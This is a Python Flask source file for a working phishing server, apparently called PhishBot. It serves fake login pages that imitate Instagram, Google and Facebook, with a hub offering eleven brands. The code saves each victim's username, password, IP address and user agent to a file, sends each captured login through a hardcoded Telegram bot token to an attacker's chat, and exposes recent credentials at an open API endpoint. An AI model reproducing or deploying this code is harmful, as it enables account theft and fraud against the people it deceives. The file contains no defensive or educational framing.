from flask import Flask, request, render_template_string, jsonify, redirect
import json
import os
from datetime import datetime
import threading
import re

app = Flask(__name__)

# Config
BOT_TOKEN = os.getenv('BOT_TOKEN', '8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU')
ADMIN_ID = int(os.getenv('ADMIN_ID', '6593129349'))
DOMAIN = os.getenv('DOMAIN', 'https://myphish.onrender.com')
DATA_FILE = 'data.json'

SERVICES = ['instagram', 'google', 'facebook', 'snapchat', 'spotify', 'netflix', 'paypal', 'amazon', 'discord', 'roblox', 'github']

# Data Management
def load_data():
    default_stats = {s: 0 for s in SERVICES}
    default_stats['total'] = 0
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                data['stats'] = {**default_stats, **data.get('stats', {})}
                return data
    except:
        pass
    return {'stats': default_stats, 'credentials': [], 'users': []}

def save_data(data):
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except: pass

data = load_data()

# Telegram Notification (Simple HTTP)
def notify_admin(credential):
    try:
        import requests
        service_emoji = {
            'instagram': '📸', 'google': '🔍', 'facebook': '📘', 'snapchat': '👻',
            'spotify': '🎵', 'netflix': '📺', 'paypal': '💳', 'amazon': '🛒',
            'discord': '💬', 'roblox': '🎮', 'github': '🐙'
        }
        emoji = service_emoji.get(credential['service'], '🎣')
        
        message = f"{emoji} *{credential['service'].upper()} HIT*\n" \
                 f"👤 `{credential['username']}`\n" \
                 f"🔑 `{credential['password']}`\n" \
                 f"🌐 {credential['ip']}\n" \
                 f"⏰ {credential['timestamp'][:19]}"
        
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={'chat_id': ADMIN_ID, 'text': message, 'parse_mode': 'Markdown'})
    except: pass

# Routes
@app.route('/')
def index():
    services_html = ''.join([f'''
        <a href="/{s}" class="card {s}" style="background: var(--bg-{s});">
            <span>{s.title()}</span>
        </a>''' for s in SERVICES])
    
    return render_template_string(f'''
<!DOCTYPE html>
<html><head>
    <title>Login Hub</title>
    <meta name="viewport" content="width=device-width">
    <style>
        :root {{
            --bg-instagram: linear-gradient(45deg,#f09433,#e6683c);
            --bg-google: #4285f4;
            --bg-facebook: #1877f2;
            --bg-snapchat: linear-gradient(45deg,#fffc00,#fff400);
            --bg-spotify: #1db954;
            --bg-netflix: #e50914;
            --bg-paypal: #003087;
            --bg-amazon: #ff9900;
            --bg-discord: #5865f2;
            --bg-roblox: #00b6f0;
            --bg-github: #24292e;
        }}
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:#000;color:#fff;font-family:system-ui;padding:20px;min-height:100vh}}
        h1{{text-align:center;margin:40px 0 30px;font-size:2em}}
        .grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;max-width:900px;margin:0 auto}}
        .card{{padding:30px 20px;text-align:center;border-radius:15px;cursor:pointer;transition:all .3s;text-decoration:none;color:#fff;font-weight:600;font-size:16px;height:80px;display:flex;align-items:center;justify-content:center}}
        .card:hover{{transform:scale(1.08);box-shadow:0 15px 40px rgba(0,0,0,.6)}}
        .snapchat {{color:#000}}
    </style>
</head><body>
    <h1>🎣 Choose Service</h1>
    <div class="grid">{services_html}</div>
</body></html>''')

@app.route('/<service>')
def phish_page(service):
    if service not in SERVICES: return "404", 404
    
    # Dynamic perfect phishing pages
    templates = {
        'instagram': '''
<div class="instagram-page">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
    <div class="form-box">
        <input type="text" name="username" placeholder="Phone, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log in</button>
    </div>
</div>
<style>
.instagram-page{{background:linear-gradient(45deg,#405de6,#5851db,#833ab4,#c13584,#e1306c,#fd1d1d);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}}
.logo{{height:51px;margin-bottom:40px}}
.form-box{{background:#fff;border-radius:4px;padding:40px 30px;max-width:350px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,.3)}}
input{{width:100%;height:36px;border:1px solid #efefef;border-radius:3px;margin:10px 0;padding:10px 13px;background:#fafafa;font-size:14px;box-sizing:border-box}}
input:focus{{outline:none;background:#fff;border-color:#dbdbdb}}
button{{width:100%;height:36px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:600;cursor:pointer;margin-top:10px}}
button:hover{{background:#1874c4}}
</style>''',
        
        'google': '''
<div class="google-page">
    <div style="flex:1;display:flex;align-items:center;justify-content:center">
        <form style="max-width:400px;width:100%">
            <div style="margin-bottom:24px">
                <input type="email" name="username" placeholder="Email or phone" required style="width:100%;height:44px;border:1px solid #dadce0;border-radius:4px;padding:13px 16px;font-size:16px;background:#fafbfc">
            </div>
            <input type="password" name="password" placeholder="Password" required style="width:100%;height:44px;border:1px solid #dadce0;border-radius:4px;padding:13px 16px;font-size:16px;background:#fafbfc;margin-bottom:16px">
            <button type="submit" style="width:100%;height:36px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer">Next</button>
        </form>
    </div>
</div>
<style>body{{font-family:"Roboto",sans-serif;background:#fff;margin:0;display:flex;flex-direction:column;height:100vh}}.google-page{{flex:1}}</style>''',
        
        'facebook': '''
<div class="fb-page" style="background:linear-gradient(180deg,#f0f2f5,#fff);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px">
    <div style="background:#fff;border-radius:8px;padding:24px;max-width:396px;width:100%;box-shadow:0 2px 4px rgba(0,0,0,.1)">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw8.svg" style="width:180px;height:40px;margin:0 auto 24px;display:block">
        <form>
            <input type="text" name="username" placeholder="Email or phone number" required style="width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin-bottom:10px;font-size:16px">
            <input type="password" name="password" placeholder="Password" required style="width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin-bottom:16px;font-size:16px">
            <button type="submit" style="width:100%;height:40px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer">Log In</button>
        </form>
    </div>
</div>'''
    }
    
    template = templates.get(service, templates['instagram'])
    form_action = f"/capture/{service}"
    
    return render_template_string(f'''
<!DOCTYPE html>
<html><head>
    <title>{service.title()}</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
</head><body>
    <form action="{form_action}" method="POST" style="display:none">
        <input type="hidden" name="victim_id" id="victim_id" value="">
    </form>
    <div style="position:relative">{template}</div>
    <script>
    document.querySelectorAll('input[name="username"], input[name="email"]').forEach(el => {{
        el.addEventListener('input', () => {{
            document.getElementById('victim_id').value = document.referrer || location.href;
        }});
    }});
    document.querySelector('form')?.addEventListener('submit', e => {{
        document.querySelector('form[action*="/capture"]').submit();
    }});
    </script>
</body></html>''')

@app.route('/capture/<service>', methods=['POST'])
def capture(service):
    global data
    if service in SERVICES:
        username = request.form.get('username') or request.form.get('email') or request.form.get('phone', '')
        password = request.form.get('password', '')
        
        if username and password:
            credential = {
                'service': service,
                'username': username,
                'password': password,
                'ip': request.remote_addr,
                'ua': request.headers.get('User-Agent', '')[:200],
                'timestamp': datetime.now().isoformat()
            }
            data['credentials'].append(credential)
            data['stats']['total'] += 1
            data['stats'][service] += 1
            save_data(data)
            threading.Thread(target=notify_admin, args=(credential,)).start()
    
    return '''
<!DOCTYPE html>
<html><head><title>Success</title>
<style>body{{background:#00c851;color:#fff;font-family:system-ui;text-align:center;padding:100px}}
.success{{font-size:3em;margin:20px 0}}</style></head>
<body><div class="success">✅ Redirecting...</div><p>Login successful!</p></body></html>'''

@app.route('/api/stats')
def stats(): return jsonify(data['stats'])

@app.route('/api/creds')
def creds(): return jsonify(data['credentials'][-20:])

@app.route('/health')
def health(): return "OK"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("🚀 PhishBot Starting on port", port)
    app.run(host='0.0.0.0', port=port, debug=False)
